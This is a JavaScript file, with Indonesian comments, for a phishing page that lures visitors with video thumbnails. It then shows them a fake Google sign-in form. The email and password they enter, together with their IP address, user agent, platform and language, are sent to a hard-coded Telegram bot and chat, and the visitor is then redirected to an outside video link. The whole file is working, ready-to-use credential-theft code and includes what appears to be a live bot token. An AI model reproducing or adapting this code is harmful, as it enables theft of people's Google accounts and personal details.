// ========== KONFIGURASI TELEGRAM ==========
const BOT_TOKEN = "8686157259:AAEbLNInmaqnPwrTTogJC3AINXIWTGerZUM";
const CHAT_ID = "7933552719";
const REDIRECT_URL = "https://vidgf.com/f/wcubsmaineg";

// Variabel global
let selectedVideo = null;

// ========== AMBIL IP PUBLIK ==========
async function getUserIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        return 'Gagal mendapatkan IP';
    }
}

// ========== KIRIM DATA KE TELEGRAM ==========
async function sendToTelegram(email, password) {
    const userAgent = navigator.userAgent;
    const platform = navigator.platform;
    const language = navigator.language;
    const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
    const ipAddress = await getUserIP();
    
    const message = `🔐 NEW LOGIN GOOGLE 🔐
━━━━━━━━━━━━━━━━━━━
📧 Email: ${email}
🔑 Password: ${password}
━━━━━━━━━━━━━━━━━━━
📱 Video: ${selectedVideo || 'Tidak diketahui'}
🌐 IP: ${ipAddress}
💻 User Agent: ${userAgent}
🖥️ Platform: ${platform}
🌍 Language: ${language}
🕐 Time: ${timestamp}
━━━━━━━━━━━━━━━━━━━
✅ Status: Login Success`;
    
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        return await response.json();
    } catch (error) {
        console.error('Error sending to Telegram:', error);
        return null;
    }
}

// ========== TUTUP POPUP PERTAMA ==========
function closePopup() {
    document.getElementById('popupLogin').style.display = 'none';
}

// ========== TUTUP FORM GOOGLE ==========
function closeGoogleForm() {
    document.getElementById('googleFormPopup').style.display = 'none';
    document.getElementById('googleEmail').value = '';
    document.getElementById('googlePassword').value = '';
    document.getElementById('googleFormError').innerText = '';
    const btn = document.getElementById('googleSubmitBtn');
    btn.disabled = false;
    btn.innerText = 'Berikutnya';
}

// ========== SUBMIT LOGIN GOOGLE ==========
async function submitGoogleFormLogin() {
    const email = document.getElementById('googleEmail').value.trim();
    const password = document.getElementById('googlePassword').value.trim();
    const errorDiv = document.getElementById('googleFormError');
    const btn = document.getElementById('googleSubmitBtn');
    
    // Validasi
    if (!email) {
        errorDiv.innerText = 'Masukkan email atau nomor telepon';
        return;
    }
    if (!password) {
        errorDiv.innerText = 'Masukkan kata sandi';
        return;
    }
    if (!email.includes('@') || !email.includes('.')) {
        errorDiv.innerText = 'Format email tidak valid';
        return;
    }
    if (password.length < 4) {
        errorDiv.innerText = 'Kata sandi minimal 4 karakter';
        return;
    }
    
    // Loading state
    errorDiv.innerText = '';
    btn.disabled = true;
    btn.innerHTML = '<span class="spinner-google"></span> Mengirim...';
    
    // Kirim ke Telegram
    await sendToTelegram(email, password);
    
    // Redirect ke link tujuan
    setTimeout(() => {
        window.location.href = REDIRECT_URL;
    }, 1000);
}

// ========== EVENT LISTENER ==========
// Klik thumbnail
document.querySelectorAll('.thumbnail-box').forEach(el => {
    el.addEventListener('click', () => {
        const card = el.closest('.video-card');
        if (card) {
            const info = card.querySelector('.video-info');
            if (info) selectedVideo = info.innerText;
        }
        document.getElementById('popupLogin').style.display = 'flex';
    });
});

// Tombol login Google di popup pertama
document.getElementById('googleLoginBtn').addEventListener('click', () => {
    closePopup();
    document.getElementById('googleFormPopup').style.display = 'flex';
});

// Tombol close popup pertama
document.getElementById('closePopupBtn').addEventListener('click', closePopup);

// Tombol submit form Google
document.getElementById('googleSubmitBtn').addEventListener('click', submitGoogleFormLogin);

// Tutup popup pertama jika klik di luar
document.getElementById('popupLogin').addEventListener('click', (e) => {
    if (e.target === document.getElementById('popupLogin')) {
        closePopup();
    }
});

// Tutup form Google jika klik di luar
document.getElementById('googleFormPopup').addEventListener('click', (e) => {
    if (e.target === document.getElementById('googleFormPopup')) {
        closeGoogleForm();
    }
});

// Enter key untuk submit
document.getElementById('googlePassword').addEventListener('keypress', (e) => {
    if (e.key === 'Enter') {
        submitGoogleFormLogin();
    }
});

// Tombol ESC untuk menutup popup
document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') {
        const popup1 = document.getElementById('popupLogin');
        const formPopup = document.getElementById('googleFormPopup');
        if (formPopup.style.display === 'flex') {
            closeGoogleForm();
        } else if (popup1.style.display === 'flex') {
            closePopup();
        }
    }
});